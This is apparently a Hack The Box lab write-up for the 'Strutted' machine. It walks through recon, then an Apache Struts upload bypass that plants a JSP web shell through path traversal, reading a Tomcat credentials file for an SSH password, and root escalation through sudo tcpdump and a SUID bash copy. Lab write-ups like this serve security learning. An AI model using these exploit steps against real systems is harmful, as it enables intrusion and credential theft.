# Strutted

IP address: 10.10.11.59

OS: Linux

## Nmap

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.10.11.59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 04:47 EDT
Nmap scan report for strutted.htb (10.10.11.59)
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   17.62 ms 10.10.16.1
2   40.03 ms strutted.htb (10.10.11.59)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
```

- Port 22 (SSH) and 80 (HTTP) open
- OS details: Linux 5.0 - 5.14

## Port 22 (SSH)

```bash
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
```

- Probably not our way in
- Will come in handy in establishing persistence later

## Port 80 (HTTP)

```bash
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
```

- Nginx 1.18.0 (Ubuntu)
- Title of the page indicates we will be allowed to upload images
- We can probably abuse this feature

### Web Application

<img width="1920" height="745" alt="image" src="https://github.com/user-attachments/assets/a0894929-318f-4a6a-9b46-e4b3597a110f" />

- Image hosting service
- Supported file types: JPG, JPEG, PNG, GIF
- Claims to offer advanced encryption and secure storage solutions
- Docker images of the environment available to download

<img width="1920" height="745" alt="image 1" src="https://github.com/user-attachments/assets/fc6939ba-4f0e-4b66-897d-77aeefe6ff5a" />

- 404 / invalid directory responses reveal: `Apache Tomcat 9.0.58 (Ubuntu)`
- Nginx is acting as a Reverse Proxy to a Tomcat backend

### Docker Image

<img width="1920" height="745" alt="image 2" src="https://github.com/user-attachments/assets/e8b8f3fe-afa2-4cff-9423-ad5043e92aa8" />

- `tomcat-users.xml` immediately stands out

<img width="1920" height="745" alt="image 3" src="https://github.com/user-attachments/assets/a52d5568-27b4-44a1-a97a-74b697e065ed" />

- Username: `admin`
- Password: `skqKY6360z!Y`
- These credentials weren’t useful

```bash
┌──(kali㉿kali)-[~/Downloads/strutted/strutted]
└─$ cat pom.xml 

<properties>
  <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  <maven.compiler.source>17</maven.compiler.source>
  <maven.compiler.target>17</maven.compiler.target>
  <struts2.version>6.3.0.1</struts2.version>
  <jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
  <maven.javadoc.skip>true</maven.javadoc.skip>
  <jackson.version>2.14.1</jackson.version>
  <jackson-data-bind.version>2.14.1</jackson-data-bind.version>
</properties>
```

- Apache struts `6.3.0.1` is vulnerable to CVE-2024-53677
- I read about the vulnerability and how to exploit it on this article: [https://blogs.hiteshpatra.in/cve-2024-53677-apache-struts-file-upload-vulnerability-leading-to-rce](https://blogs.hiteshpatra.in/cve-2024-53677-apache-struts-file-upload-vulnerability-leading-to-rce)

## Initial Access

- HTTP request and response when uploading a test image:

<img width="1920" height="920" alt="image" src="https://github.com/user-attachments/assets/2cf88b4d-ab31-4e6a-9aea-f3e87049b91b" />

- We know that Struts 6.3.0.1 has a file upload validation bypass vulnerability from previous reading:
    - The file upload interceptor does not properly enforce file extension and path validation when multipart field names or related parameters are manipulated.
- We will modify the HTTP request to successfully upload a web shell as shown below:

```bash
POST /upload.action HTTP/1.1
Host: strutted.htb
Content-Length: 1652
Cache-Control: max-age=0
Origin: http://strutted.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzuL6fjL87vEYS8TJ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://strutted.htb/upload.action;jsessionid=B450348EDD368512170F1B32536EE482
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=B450348EDD368512170F1B32536EE482

------WebKitFormBoundaryzuL6fjL87vEYS8TJ
Content-Disposition: form-data; name="Upload"; filename="test.png"
Content-Type: image/png

PNG [Binary PNG bytes]
[JSP payload]
------WebKitFormBoundaryzuL6fjL87vEYS8TJ
Content-Disposition: form-data; name="top.uploadFileName"

../../cmd.jsp
------WebKitFormBoundaryzuL6fjL87vEYS8TJ--
```

<img width="1739" height="524" alt="image 1" src="https://github.com/user-attachments/assets/92a3e324-220c-47c6-9db1-0ad836bab449" />

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X GET "http://strutted.htb/cmd.jsp?cmd=whoami" --output - 

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: whoami<BR>
tomcat

</pre>
</BODY></HTML>              
```

- User enumeration revealed a user `james`
- Directory enumeration revealed the file `/etc/tomcat/tomcat-users.xml`  which contains a password:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X GET "http://strutted.htb/cmd.jsp?cmd=cat+%2Fetc%2Ftomcat9%2Ftomcat-users.xml" --output - 

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: cat /etc/tomcat9/tomcat-users.xml<BR>
<?xml version="1.0" encoding="UTF-8"?>
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
</pre>
</BODY></HTML>                                                   
```

- We were able to SSH into the target machine using the credentials `james:IT14d6SSP81k`

```bash
┌──(kali㉿kali)-[~]
└─$ ssh james@strutted.htb
james@strutted.htb's password: 
james@strutted:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)
```

### User Flag

```bash
james@strutted:~$ cat user.txt 
60884dcb72578e032d78a8874ef3e9df
```

## Privilege Escalation

### Sudo

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

- GTFOBins has an entry for tcpdump
- We create a script that will copy `/bin/bash` to `/tmp/root` , assign it the SUID bit, and execute it with root privilege

```bash
james@strutted:~$ COMMAND='cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root'
james@strutted:~$ TF=$(mktemp)
james@strutted:~$  echo "$COMMAND" > $TF
james@strutted:~$ chmod +x $TF
james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
james@strutted:~$ ls -la /tmp/root
-rwsr-sr-x 1 root root 1396520 Oct 31 00:23 /tmp/root
```

- Now we can run `/tmp/root -p` where `-p` is used to preserve the effective privileges

```bash
james@strutted:~$ /tmp/root -p
root-5.1# whoami
root
```

### Root Flag

```bash
root-5.1# cat /root/root.txt
07aff89e9b9164f49546eb0bd12028e5
```
